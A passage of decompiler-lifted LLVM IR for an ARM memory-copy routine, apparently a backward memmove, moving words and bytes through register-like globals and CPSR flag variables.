  store i32 %v6_12728, i32* %r4.global-to-local, align 4
  %v7_12728 = add i32 %v0_12728, -12
  %v8_12728 = inttoptr i32 %v7_12728 to i32*
  %v9_12728 = load i32, i32* %v8_12728, align 4
  store i32 %v9_12728, i32* @ip, align 4
  %v10_12728 = add i32 %v0_12728, -16
  %v11_12728 = inttoptr i32 %v10_12728 to i32*
  %v12_12728 = load i32, i32* %v11_12728, align 4
  store i32 %v12_12728, i32* %lr.global-to-local, align 4
  store i32 %v10_12728, i32* @r1, align 4
  %v1_1272c = add i32 %v0_12724, -32
  %v2_1272c = inttoptr i32 %v1_1272c to i32*
  store i32 %v3_12728, i32* %v2_1272c, align 4
  %v4_1272c = add i32 %v0_12724, -28
  %v5_1272c = inttoptr i32 %v4_1272c to i32*
  %v6_1272c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1272c, i32* %v5_1272c, align 4
  %v7_1272c = add i32 %v0_12724, -24
  %v8_1272c = inttoptr i32 %v7_1272c to i32*
  %v9_1272c = load i32, i32* @ip, align 4
  store i32 %v9_1272c, i32* %v8_1272c, align 4
  %v10_1272c = add i32 %v0_12724, -20
  %v11_1272c = inttoptr i32 %v10_1272c to i32*
  %v12_1272c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1272c, i32* %v11_1272c, align 4
  store i32 %v1_1272c, i32* %r0.global-to-local, align 4
  %v0_12730 = load i32, i32* %r2.global-to-local, align 4
  %v2_12730 = add i32 %v0_12730, -32
  store i32 %v2_12730, i32* %r2.global-to-local, align 4
  %v6_12734 = icmp slt i32 %v0_12730, 32
  br i1 %v6_12734, label %dec_label_pc_12738.loopexit, label %dec_label_pc_12720.dec_label_pc_12720_crit_edge

dec_label_pc_12720.dec_label_pc_12720_crit_edge:  ; preds = %dec_label_pc_12720
  %v0_12720.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12720

dec_label_pc_12738.loopexit:                      ; preds = %dec_label_pc_12720
  %v4_12730 = sub i32 31, %v0_12730
  %v5_12730 = and i32 %v4_12730, %v0_12730
  %v6_12730 = icmp slt i32 %v5_12730, 0
  %v7_12730 = icmp slt i32 %v2_12730, 0
  store i1 %v6_12730, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12730, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12738

dec_label_pc_12738:                               ; preds = %dec_label_pc_12738.loopexit, %dec_label_pc_12714
  %v6_12740 = phi i32 [ %v1_1272c, %dec_label_pc_12738.loopexit ], [ %v0_1272448, %dec_label_pc_12714 ]
  %v0_12748.pr = phi i32 [ %v2_12730, %dec_label_pc_12738.loopexit ], [ %v2_12718, %dec_label_pc_12714 ]
  %v4_12738 = add i32 %v0_12748.pr, 16
  %v6_12738 = sub i32 0, %v0_12748.pr
  %v7_12738 = and i32 %v4_12738, %v6_12738
  %v8_12738 = icmp slt i32 %v7_12738, 0
  store i1 %v8_12738, i1* %cpsr_v.global-to-local, align 1
  %v9_12738 = icmp slt i32 %v4_12738, 0
  store i1 %v9_12738, i1* %cpsr_n.global-to-local, align 1
  %v5_1273c = icmp slt i32 %v0_12748.pr, -16
  br i1 %v5_1273c, label %.thread13, label %bb139

bb139:                                            ; preds = %dec_label_pc_12738
  %v6_1273c = load i32, i32* @r1, align 4
  %v7_1273c = add i32 %v6_1273c, -4
  %v8_1273c = inttoptr i32 %v7_1273c to i32*
  %v9_1273c = load i32, i32* %v8_1273c, align 4
  store i32 %v9_1273c, i32* %r3.global-to-local, align 4
  %v10_1273c = add i32 %v6_1273c, -8
  %v11_1273c = inttoptr i32 %v10_1273c to i32*
  %v12_1273c = load i32, i32* %v11_1273c, align 4
  store i32 %v12_1273c, i32* %r4.global-to-local, align 4
  %v13_1273c = add i32 %v6_1273c, -12
  %v14_1273c = inttoptr i32 %v13_1273c to i32*
  %v15_1273c = load i32, i32* %v14_1273c, align 4
  store i32 %v15_1273c, i32* @ip, align 4
  %v16_1273c = add i32 %v6_1273c, -16
  %v17_1273c = inttoptr i32 %v16_1273c to i32*
  %v18_1273c = load i32, i32* %v17_1273c, align 4
  store i32 %v18_1273c, i32* %lr.global-to-local, align 4
  store i32 %v16_1273c, i32* @r1, align 4
  %v7_12740 = add i32 %v6_12740, -16
  %v8_12740 = inttoptr i32 %v7_12740 to i32*
  store i32 %v9_1273c, i32* %v8_12740, align 4
  %v10_12740 = add i32 %v6_12740, -12
  %v11_12740 = inttoptr i32 %v10_12740 to i32*
  %v12_12740 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_12740, i32* %v11_12740, align 4
  %v13_12740 = add i32 %v6_12740, -8
  %v14_12740 = inttoptr i32 %v13_12740 to i32*
  %v15_12740 = load i32, i32* @ip, align 4
  store i32 %v15_12740, i32* %v14_12740, align 4
  %v16_12740 = add i32 %v6_12740, -4
  %v17_12740 = inttoptr i32 %v16_12740 to i32*
  %v18_12740 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_12740, i32* %v17_12740, align 4
  store i32 %v7_12740, i32* %r0.global-to-local, align 4
  %v6_12744 = load i32, i32* %r2.global-to-local, align 4
  %v7_12744 = add i32 %v6_12744, -16
  store i32 %v7_12744, i32* %r2.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %dec_label_pc_12738, %bb139
  %v6_12750 = phi i32 [ %v7_12740, %bb139 ], [ %v6_12740, %dec_label_pc_12738 ]
  %v0_12748 = phi i32 [ %v7_12744, %bb139 ], [ %v0_12748.pr, %dec_label_pc_12738 ]
  %v4_12748 = add i32 %v0_12748, 20
  store i32 %v4_12748, i32* %r2.global-to-local, align 4
  %v6_12748 = sub i32 0, %v0_12748
  %v7_12748 = and i32 %v4_12748, %v6_12748
  %v8_12748 = icmp slt i32 %v7_12748, 0
  store i1 %v8_12748, i1* %cpsr_v.global-to-local, align 1
  %v9_12748 = icmp slt i32 %v4_12748, 0
  store i1 %v9_12748, i1* %cpsr_n.global-to-local, align 1
  %v5_1274c = icmp slt i32 %v0_12748, -20
  br i1 %v5_1274c, label %.thread15, label %bb140

bb140:                                            ; preds = %.thread13
  %v6_1274c = load i32, i32* @r1, align 4
  %v7_1274c = add i32 %v6_1274c, -4
  %v8_1274c = inttoptr i32 %v7_1274c to i32*
  %v9_1274c = load i32, i32* %v8_1274c, align 4
  store i32 %v9_1274c, i32* %r3.global-to-local, align 4
  %v10_1274c = add i32 %v6_1274c, -8
  %v11_1274c = inttoptr i32 %v10_1274c to i32*
  %v12_1274c = load i32, i32* %v11_1274c, align 4
  store i32 %v12_1274c, i32* @ip, align 4
  %v13_1274c = add i32 %v6_1274c, -12
  %v14_1274c = inttoptr i32 %v13_1274c to i32*
  %v15_1274c = load i32, i32* %v14_1274c, align 4
  store i32 %v15_1274c, i32* %lr.global-to-local, align 4
  store i32 %v13_1274c, i32* @r1, align 4
  %v7_12750 = add i32 %v6_12750, -12
  %v8_12750 = inttoptr i32 %v7_12750 to i32*
  store i32 %v9_1274c, i32* %v8_12750, align 4
  %v10_12750 = add i32 %v6_12750, -8
  %v11_12750 = inttoptr i32 %v10_12750 to i32*
  %v12_12750 = load i32, i32* @ip, align 4
  store i32 %v12_12750, i32* %v11_12750, align 4
  %v13_12750 = add i32 %v6_12750, -4
  %v14_12750 = inttoptr i32 %v13_12750 to i32*
  %v15_12750 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_12750, i32* %v14_12750, align 4
  store i32 %v7_12750, i32* %r0.global-to-local, align 4
  %v6_12754 = load i32, i32* %r2.global-to-local, align 4
  %v7_12754 = add i32 %v6_12754, -12
  store i32 %v7_12754, i32* %r2.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread13, %bb140
  %v6_1277456 = phi i32 [ %v6_12750, %.thread13 ], [ %v7_12750, %bb140 ]
  %v0_1275c54 = phi i32 [ %v4_12748, %.thread13 ], [ %v7_12754, %bb140 ]
  %v2_12758 = load i8*, i8** %stack_var_-8, align 4
  %v3_12758 = ptrtoint i8* %v2_12758 to i32
  store i32 %v3_12758, i32* @r4, align 4
  store i32 %v8_12714, i32* @lr, align 4
  br label %dec_label_pc_1275c

dec_label_pc_1275c:                               ; preds = %dec_label_pc_1270c, %.thread15
  %v7_1276c = phi i32 [ %v0_1272448, %dec_label_pc_1270c ], [ %v6_1277456, %.thread15 ]
  %v0_1275c = phi i32 [ %v2_1270c, %dec_label_pc_1270c ], [ %v0_1275c54, %.thread15 ]
  %v2_1275c = add i32 %v0_1275c, 8
  store i32 %v2_1275c, i32* %r2.global-to-local, align 4
  %v4_1275c = sub i32 0, %v0_1275c
  %v5_1275c = and i32 %v2_1275c, %v4_1275c
  %v6_1275c = icmp slt i32 %v5_1275c, 0
  store i1 %v6_1275c, i1* %cpsr_v.global-to-local, align 1
  %v7_1275c = icmp slt i32 %v2_1275c, 0
  store i1 %v7_1275c, i1* %cpsr_n.global-to-local, align 1
  %v5_12760 = icmp slt i32 %v0_1275c, -8
  br i1 %v5_12760, label %bb142, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_1275c
  %v6_12764 = add i32 %v0_1275c, 4
  store i32 %v6_12764, i32* %r2.global-to-local, align 4
  %v8_12764 = sub i32 -5, %v0_1275c
  %v9_12764 = and i32 %v8_12764, %v2_1275c
  %v10_12764 = icmp slt i32 %v9_12764, 0
  store i1 %v10_12764, i1* %cpsr_v.global-to-local, align 1
  %v11_12764 = icmp slt i32 %v6_12764, 0
  store i1 %v11_12764, i1* %cpsr_n.global-to-local, align 1
  %v5_12768 = icmp slt i32 %v2_1275c, 4
  %v6_12768 = load i32, i32* @r1, align 4
  %v7_12768 = add i32 %v6_12768, -4
  %v8_12768 = inttoptr i32 %v7_12768 to i32*
  %v9_12768 = load i32, i32* %v8_12768, align 4
  store i32 %v9_12768, i32* %r3.global-to-local, align 4
  br i1 %v5_12768, label %.thread19, label %bb141

.thread19:                                        ; preds = %dec_label_pc_12764
  store i32 %v7_12768, i32* @r1, align 4
  %v8_1276c = add i32 %v7_1276c, -4
  %v9_1276c = inttoptr i32 %v8_1276c to i32*
  store i32 %v9_12768, i32* %v9_1276c, align 4
  %v10_1276c = load i32, i32* %r0.global-to-local, align 4
  %v11_1276c = add i32 %v10_1276c, -4
  store i32 %v11_1276c, i32* %r0.global-to-local, align 4
  %v0_1277c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb142

bb141:                                            ; preds = %dec_label_pc_12764
  %v10_12770 = add i32 %v6_12768, -8
  %v11_12770 = inttoptr i32 %v10_12770 to i32*
  %v12_12770 = load i32, i32* %v11_12770, align 4
  store i32 %v12_12770, i32* @ip, align 4
  store i32 %v10_12770, i32* @r1, align 4
  %v7_12774 = add i32 %v7_1276c, -8
  %v8_12774 = inttoptr i32 %v7_12774 to i32*
  store i32 %v9_12768, i32* %v8_12774, align 4
  %v10_12774 = add i32 %v7_1276c, -4
  %v11_12774 = inttoptr i32 %v10_12774 to i32*
  %v12_12774 = load i32, i32* @ip, align 4
  store i32 %v12_12774, i32* %v11_12774, align 4
  store i32 %v7_12774, i32* %r0.global-to-local, align 4
  %v6_12778 = load i32, i32* %r2.global-to-local, align 4
  %v7_12778 = add i32 %v6_12778, -4
  store i32 %v7_12778, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %.thread19, %.thread25, %dec_label_pc_1275c, %dec_label_pc_126ec, %dec_label_pc_12920, %dec_label_pc_128b4, %dec_label_pc_12848, %bb141
  %v2_12780 = phi i32 [ %v11_1276c, %.thread19 ], [ %v0_1281831, %.thread25 ], [ %v7_1276c, %dec_label_pc_1275c ], [ %v2_126f0, %dec_label_pc_126ec ], [ %v2_1278c64, %dec_label_pc_12920 ], [ %v2_1278c63, %dec_label_pc_128b4 ], [ %v2_1278c62, %dec_label_pc_12848 ], [ %v7_12774, %bb141 ]
  %v0_1277c = phi i32 [ %v0_1277c.pre, %.thread19 ], [ %v2_127c0, %.thread25 ], [ %v2_1275c, %dec_label_pc_1275c ], [ %v2_126f4, %dec_label_pc_126ec ], [ %v0_1277c60, %dec_label_pc_12920 ], [ %v0_1277c59, %dec_label_pc_128b4 ], [ %v0_1277c58, %dec_label_pc_12848 ], [ %v7_12778, %bb141 ]
  %v1_1277c = add i32 %v0_1277c, 4
  store i32 %v1_1277c, i32* @r2, align 4
  %v3_1277c = sub i32 0, %v0_1277c
  %v4_1277c = and i32 %v1_1277c, %v3_1277c
  %v5_1277c = icmp slt i32 %v4_1277c, 0
  store i1 %v5_1277c, i1* %cpsr_v.global-to-local, align 1
  %v6_1277c = icmp slt i32 %v1_1277c, 0
  store i1 %v6_1277c, i1* %cpsr_n.global-to-local, align 1
  %v7_1277c = icmp eq i32 %v1_1277c, 0
  store i1 %v7_1277c, i1* @cpsr_z, align 1
  br i1 %v7_1277c, label %.thread122, label %bb143

bb143:                                            ; preds = %bb142
  %v1_12784 = add i32 %v0_1277c, 2
  %v3_12784 = sub i32 -3, %v0_1277c
  %v4_12784 = and i32 %v3_12784, %v1_1277c
  %v5_12784 = icmp slt i32 %v4_12784, 0
  store i1 %v5_12784, i1* %cpsr_v.global-to-local, align 1
  %v6_12784 = icmp slt i32 %v1_12784, 0
  store i1 %v6_12784, i1* %cpsr_n.global-to-local, align 1
  %v7_12784 = icmp eq i32 %v1_1277c, 2
  store i1 %v7_12784, i1* @cpsr_z, align 1
  %v0_12788 = load i32, i32* @r1, align 4
  %v1_12788 = add i32 %v0_12788, -1
  %v2_12788 = inttoptr i32 %v1_12788 to i8*
  %v3_12788 = load i8, i8* %v2_12788, align 1
  %v4_12788 = zext i8 %v3_12788 to i32
  store i32 %v4_12788, i32* %r3.global-to-local, align 4
  store i32 %v1_12788, i32* @r1, align 4
  %v3_1278c = add i32 %v2_12780, -1
  %v4_1278c = inttoptr i32 %v3_1278c to i8*
  store i8 %v3_12788, i8* %v4_1278c, align 1
  %v5_1278c = load i32, i32* %r0.global-to-local, align 4
  %v6_1278c = add i32 %v5_1278c, -1
  store i32 %v6_1278c, i32* %r0.global-to-local, align 4
  %v0_12790 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_12790 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_12790 = xor i1 %v0_12790, %v1_12790
  br i1 %v2_12790, label %.thread121, label %bb144

bb144:                                            ; preds = %bb143
  %v3_12790 = load i32, i32* @r1, align 4
  %v4_12790 = add i32 %v3_12790, -1
  %v5_12790 = inttoptr i32 %v4_12790 to i8*
  %v6_12790 = load i8, i8* %v5_12790, align 1
  %v7_12790 = zext i8 %v6_12790 to i32
  store i32 %v7_12790, i32* %r3.global-to-local, align 4
  store i32 %v4_12790, i32* @r1, align 4
  %v6_12794 = add i32 %v5_1278c, -2
  %v7_12794 = inttoptr i32 %v6_12794 to i8*
  store i8 %v6_12790, i8* %v7_12794, align 1
  %v8_12794 = load i32, i32* %r0.global-to-local, align 4
  %v9_12794 = add i32 %v8_12794, -1
  store i32 %v9_12794, i32* %r0.global-to-local, align 4
  %v1_12798.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_12798.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread121

.thread121:                                       ; preds = %bb143, %bb144
  %v7_1279c = phi i32 [ %v9_12794, %bb144 ], [ %v6_1278c, %bb143 ]
  %v2_1279c = phi i1 [ %v2_12798.pre, %bb144 ], [ %v1_12790, %bb143 ]
  %v1_1279c = phi i1 [ %v1_12798.pre, %bb144 ], [ %v0_12790, %bb143 ]
  %v0_12798 = load i1, i1* @cpsr_z, align 1
  %v3_12798 = xor i1 %v2_1279c, %v1_1279c
  %v4_12798 = or i1 %v0_12798, %v3_12798
  br i1 %v4_12798, label %.thread122, label %bb145

bb145:                                            ; preds = %.thread121
  %v5_12798 = load i32, i32* @r1, align 4
  %v6_12798 = add i32 %v5_12798, -1
  %v7_12798 = inttoptr i32 %v6_12798 to i8*
  %v8_12798 = load i8, i8* %v7_12798, align 1
  %v9_12798 = zext i8 %v8_12798 to i32
  store i32 %v9_12798, i32* %r3.global-to-local, align 4
  store i32 %v6_12798, i32* @r1, align 4
  %v8_1279c = add i32 %v7_1279c, -1
  %v9_1279c = inttoptr i32 %v8_1279c to i8*
  store i8 %v8_12798, i8* %v9_1279c, align 1
  %v10_1279c = load i32, i32* %r0.global-to-local, align 4
  %v11_1279c = add i32 %v10_1279c, -1
  store i32 %v11_1279c, i32* %r0.global-to-local, align 4
  br label %.thread122

dec_label_pc_127a4:                               ; preds = %dec_label_pc_126fc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_127a4 = icmp eq i32 %v1_126fc, 1
  store i1 %v8_127a4, i1* %cpsr_n.global-to-local, align 1
  %v1_127a8 = add i32 %v2_126ec, -1
  %v2_127a8 = inttoptr i32 %v1_127a8 to i8*
  %v3_127a8 = load i8, i8* %v2_127a8, align 1
  %v4_127a8 = zext i8 %v3_127a8 to i32
  store i32 %v4_127a8, i32* %r3.global-to-local, align 4
  store i32 %v1_127a8, i32* @r1, align 4
  %v3_127ac = add i32 %v2_126f0, -1
  %v4_127ac = inttoptr i32 %v3_127ac to i8*
  store i8 %v3_127a8, i8* %v4_127ac, align 1
  %v5_127ac = load i32, i32* %r0.global-to-local, align 4
  %v6_127ac = add i32 %v5_127ac, -1
  store i32 %v6_127ac, i32* %r0.global-to-local, align 4
  br i1 %v8_127a4, label %.thread25, label %bb146

bb146:                                            ; preds = %dec_label_pc_127a4
  %v9_127a4 = icmp eq i32 %v1_126fc, 2
  %v6_127b0 = load i32, i32* @r1, align 4
  %v7_127b0 = add i32 %v6_127b0, -1
  %v8_127b0 = inttoptr i32 %v7_127b0 to i8*
  %v9_127b0 = load i8, i8* %v8_127b0, align 1
  %v10_127b0 = zext i8 %v9_127b0 to i32
  store i32 %v10_127b0, i32* %r3.global-to-local, align 4
  store i32 %v7_127b0, i32* @r1, align 4
  %v9_127b4 = add i32 %v5_127ac, -2
  %v10_127b4 = inttoptr i32 %v9_127b4 to i8*
  store i8 %v9_127b0, i8* %v10_127b4, align 1
  %v11_127b4 = load i32, i32* %r0.global-to-local, align 4
  %v12_127b4 = add i32 %v11_127b4, -1
  store i32 %v12_127b4, i32* %r0.global-to-local, align 4
  br i1 %v9_127a4, label %.thread25, label %bb147

bb147:                                            ; preds = %bb146
  %v8_127b8 = load i32, i32* @r1, align 4
  %v9_127b8 = add i32 %v8_127b8, -1
  %v10_127b8 = inttoptr i32 %v9_127b8 to i8*
  %v11_127b8 = load i8, i8* %v10_127b8, align 1
  %v12_127b8 = zext i8 %v11_127b8 to i32
  store i32 %v12_127b8, i32* %r3.global-to-local, align 4
  store i32 %v9_127b8, i32* @r1, align 4
  %v11_127bc = add i32 %v11_127b4, -2
  %v12_127bc = inttoptr i32 %v11_127bc to i8*
  store i8 %v11_127b8, i8* %v12_127bc, align 1
  %v13_127bc = load i32, i32* %r0.global-to-local, align 4
  %v14_127bc = add i32 %v13_127bc, -1
  store i32 %v14_127bc, i32* %r0.global-to-local, align 4
  br label %.thread25

.thread25:                                        ; preds = %bb146, %dec_label_pc_127a4, %bb147
  %v0_1281831 = phi i32 [ %v12_127b4, %bb146 ], [ %v6_127ac, %dec_label_pc_127a4 ], [ %v14_127bc, %bb147 ]
  %v0_127c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_127c0 = load i32, i32* @ip, align 4
  %v2_127c0 = sub i32 %v0_127c0, %v1_127c0
  store i32 %v2_127c0, i32* %r2.global-to-local, align 4
  %v4_127c0 = xor i32 %v1_127c0, %v0_127c0
  %v5_127c0 = xor i32 %v2_127c0, %v0_127c0
  %v6_127c0 = and i32 %v5_127c0, %v4_127c0
  %v7_127c0 = icmp slt i32 %v6_127c0, 0
  store i1 %v7_127c0, i1* %cpsr_v.global-to-local, align 1
  %v8_127c0 = icmp slt i32 %v2_127c0, 0
  store i1 %v8_127c0, i1* %cpsr_n.global-to-local, align 1
  %v5_127c4 = icmp slt i32 %v0_127c0, %v1_127c0
  br i1 %v5_127c4, label %bb142, label %dec_label_pc_127c8

dec_label_pc_127c8:                               ; preds = %.thread25
  %v0_127c8 = load i32, i32* @r1, align 4
  %v1_127c8 = urem i32 %v0_127c8, 4
  store i32 %v1_127c8, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_127c8 = icmp eq i32 %v1_127c8, 0
  br i1 %v2_127c8, label %dec_label_pc_1270c, label %dec_label_pc_127d0

dec_label_pc_127d0:                               ; preds = %dec_label_pc_12704, %dec_label_pc_127c8
  %v0_1281830 = phi i32 [ %v2_126f0, %dec_label_pc_12704 ], [ %v0_1281831, %dec_label_pc_127c8 ]
  %v0_128c4 = phi i32 [ %v2_126f4, %dec_label_pc_12704 ], [ %v2_127c0, %dec_label_pc_127c8 ]
  %v0_127d0 = phi i32 [ %v2_126ec, %dec_label_pc_12704 ], [ %v0_127c8, %dec_label_pc_127c8 ]
  %v0_127d8 = phi i32 [ %v1_12704, %dec_label_pc_12704 ], [ %v1_127c8, %dec_label_pc_127c8 ]
  %v1_127d0 = and i32 %v0_127d0, -4
  store i32 %v1_127d0, i32* %r1.global-to-local, align 4
  %v1_127d4 = inttoptr i32 %v1_127d0 to i32*
  %v2_127d4 = load i32, i32* %v1_127d4, align 4
  store i32 %v2_127d4, i32* %r3.global-to-local, align 4
  %v7_127d8 = icmp ult i32 %v0_127d8, 2
  %v2_128bc = add i32 %v0_128c4, -12
  %v4_128bc = sub i32 11, %v0_128c4
  %v5_128bc = and i32 %v4_128bc, %v0_128c4
  %v6_128bc = icmp slt i32 %v5_128bc, 0
  store i1 %v6_128bc, i1* %cpsr_v.global-to-local, align 1
  %v7_128bc = icmp slt i32 %v2_128bc, 0
  store i1 %v7_128bc, i1* %cpsr_n.global-to-local, align 1
  %v5_128c0 = icmp slt i32 %v0_128c4, 12
  br i1 %v7_127d8, label %dec_label_pc_128bc, label %dec_label_pc_127e0

dec_label_pc_127e0:                               ; preds = %dec_label_pc_127d0
  %v8_127d8 = icmp eq i32 %v0_127d8, 2
  br i1 %v8_127d8, label %dec_label_pc_12850, label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127e0
  br i1 %v5_128c0, label %dec_label_pc_12830, label %dec_label_pc_127ec

dec_label_pc_127ec:                               ; preds = %dec_label_pc_127e4
  store i32 %v2_128bc, i32* %r2.global-to-local, align 4
  %v3_127f0 = load i32, i32* @r4, align 4
  store i32 %v3_127f0, i32* %stack_var_-12, align 4
  %v6_127f0 = load i32, i32* @r5, align 4
  %v8_127f0 = inttoptr i32 %v6_127f0 to i8*
  store i8* %v8_127f0, i8** %stack_var_-8, align 4
  %v11_127f0 = load i32, i32* @lr, align 4
  br label %dec_label_pc_127f4

dec_label_pc_127f4:                               ; preds = %dec_label_pc_127f4.dec_label_pc_127f4_crit_edge, %dec_label_pc_127ec
  %v0_12818 = phi i32 [ %v1_12818, %dec_label_pc_127f4.dec_label_pc_127f4_crit_edge ], [ %v0_1281830, %dec_label_pc_127ec ]
  %v0_127f8 = phi i32 [ %v0_127f8.pre, %dec_label_pc_127f4.dec_label_pc_127f4_crit_edge ], [ %v1_127d0, %dec_label_pc_127ec ]
  %v0_127f4 = phi i32 [ %v0_127f4.pre, %dec_label_pc_127f4.dec_label_pc_127f4_crit_edge ], [ %v2_127d4, %dec_label_pc_127ec ]
  %v3_127f4 = mul i32 %v0_127f4, 256
  store i32 %v3_127f4, i32* %lr.global-to-local, align 4
  %v1_127f8 = add i32 %v0_127f8, -4
  %v2_127f8 = inttoptr i32 %v1_127f8 to i32*
  %v3_127f8 = load i32, i32* %v2_127f8, align 4
  store i32 %v3_127f8, i32* %r3.global-to-local, align 4
  %v4_127f8 = add i32 %v0_127f8, -8
  %v5_127f8 = inttoptr i32 %v4_127f8 to i32*
  %v6_127f8 = load i32, i32* %v5_127f8, align 4
  store i32 %v6_127f8, i32* %r4.global-to-local, align 4
  %v7_127f8 = add i32 %v0_127f8, -12
  %v8_127f8 = inttoptr i32 %v7_127f8 to i32*
  %v9_127f8 = load i32, i32* %v8_127f8, align 4
  store i32 %v9_127f8, i32* %r5.global-to-local, align 4
  %v10_127f8 = add i32 %v0_127f8, -16
  %v11_127f8 = inttoptr i32 %v10_127f8 to i32*
  %v12_127f8 = load i32, i32* %v11_127f8, align 4
  store i32 %v10_127f8, i32* %r1.global-to-local, align 4
  %v4_127fc = udiv i32 %v12_127f8, 16777216
  %v5_127fc = or i32 %v4_127fc, %v3_127f4
  store i32 %v5_127fc, i32* %lr.global-to-local, align 4
  %v3_12800 = mul i32 %v12_127f8, 256
  %v4_12804 = udiv i32 %v9_127f8, 16777216
  %v5_12804 = or i32 %v3_12800, %v4_12804
  store i32 %v5_12804, i32* @ip, align 4
  %v3_12808 = mul i32 %v9_127f8, 256
  %v4_1280c = udiv i32 %v6_127f8, 16777216
  %v5_1280c = or i32 %v3_12808, %v4_1280c
  store i32 %v5_1280c, i32* %r5.global-to-local, align 4
  %v3_12810 = mul i32 %v6_127f8, 256
  %v4_12814 = udiv i32 %v3_127f8, 16777216
  %v5_12814 = or i32 %v3_12810, %v4_12814
  store i32 %v5_12814, i32* %r4.global-to-local, align 4
  %v1_12818 = add i32 %v0_12818, -16
  %v2_12818 = inttoptr i32 %v1_12818 to i32*
  store i32 %v5_12814, i32* %v2_12818, align 4
  %v4_12818 = add i32 %v0_12818, -12
  %v5_12818 = inttoptr i32 %v4_12818 to i32*
  %v6_12818 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_12818, i32* %v5_12818, align 4
  %v7_12818 = add i32 %v0_12818, -8
  %v8_12818 = inttoptr i32 %v7_12818 to i32*
  %v9_12818 = load i32, i32* @ip, align 4
  store i32 %v9_12818, i32* %v8_12818, align 4
  %v10_12818 = add i32 %v0_12818, -4
  %v11_12818 = inttoptr i32 %v10_12818 to i32*
  %v12_12818 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12818, i32* %v11_12818, align 4
  store i32 %v1_12818, i32* %r0.global-to-local, align 4
  %v0_1281c = load i32, i32* %r2.global-to-local, align 4
  %v2_1281c = add i32 %v0_1281c, -16
  store i32 %v2_1281c, i32* %r2.global-to-local, align 4
  %v6_12820 = icmp slt i32 %v0_1281c, 16
  br i1 %v6_12820, label %dec_label_pc_12824, label %dec_label_pc_127f4.dec_label_pc_127f4_crit_edge

dec_label_pc_127f4.dec_label_pc_127f4_crit_edge:  ; preds = %dec_label_pc_127f4
  %v0_127f4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_127f8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_127f4

dec_label_pc_12824:                               ; preds = %dec_label_pc_127f4
  %v2_12824 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_12824, i32* @r4, align 4
  %v5_12824 = load i8*, i8** %stack_var_-8, align 4
  %v6_12824 = ptrtoint i8* %v5_12824 to i32
  store i32 %v6_12824, i32* @r5, align 4
  store i32 %v11_127f0, i32* @lr, align 4
  %v2_12828 = add i32 %v0_1281c, -4
  store i32 %v2_12828, i32* %r2.global-to-local, align 4
  %v4_12828 = add i32 %v0_1281c, 2147483632
  %v5_12828 = and i32 %v2_12828, %v4_12828
  %v6_12828 = icmp slt i32 %v5_12828, 0
  store i1 %v6_12828, i1* %cpsr_v.global-to-local, align 1
  %v7_12828 = icmp slt i32 %v2_12828, 0
  store i1 %v7_12828, i1* %cpsr_n.global-to-local, align 1
  %v5_1282c = icmp slt i32 %v2_1281c, -12
  br i1 %v5_1282c, label %dec_label_pc_12848, label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %dec_label_pc_12824, %dec_label_pc_127e4, %dec_label_pc_12830
  %v1_1283c = phi i32 [ %v5_1283c, %dec_label_pc_12830 ], [ %v1_12818, %dec_label_pc_12824 ], [ %v0_1281830, %dec_label_pc_127e4 ]
  %v0_12830 = load i32, i32* %r3.global-to-local, align 4
  %v3_12830 = mul i32 %v0_12830, 256
  store i32 %v3_12830, i32* %ip.global-to-local, align 4
  %v0_12834 = load i32, i32* %r1.global-to-local, align 4
  %v1_12834 = add i32 %v0_12834, -4
  %v2_12834 = inttoptr i32 %v1_12834 to i32*
  %v3_12834 = load i32, i32* %v2_12834, align 4
  store i32 %v3_12834, i32* %r3.global-to-local, align 4
  store i32 %v1_12834, i32* %r1.global-to-local, align 4
  %v4_12838 = udiv i32 %v3_12834, 16777216
  %v5_12838 = or i32 %v4_12838, %v3_12830
  store i32 %v5_12838, i32* @ip, align 4
  %v2_1283c = add i32 %v1_1283c, -4
  %v3_1283c = inttoptr i32 %v2_1283c to i32*
  store i32 %v5_12838, i32* %v3_1283c, align 4
  %v4_1283c = load i32, i32* %r0.global-to-local, align 4
  %v5_1283c = add i32 %v4_1283c, -4
  store i32 %v5_1283c, i32* %r0.global-to-local, align 4
  %v0_12840 = load i32, i32* %r2.global-to-local, align 4
  %v2_12840 = add i32 %v0_12840, -4
  store i32 %v2_12840, i32* %r2.global-to-local, align 4
  %v6_12844 = icmp slt i32 %v0_12840, 4
  br i1 %v6_12844, label %dec_label_pc_12848.loopexit, label %dec_label_pc_12830

dec_label_pc_12848.loopexit:                      ; preds = %dec_label_pc_12830
  %v4_12840 = sub i32 3, %v0_12840
  %v5_12840 = and i32 %v4_12840, %v0_12840
  %v6_12840 = icmp slt i32 %v5_12840, 0
  %v7_12840 = icmp slt i32 %v2_12840, 0
  store i1 %v6_12840, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12840, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12848

dec_label_pc_12848:                               ; preds = %dec_label_pc_12848.loopexit, %dec_label_pc_12824
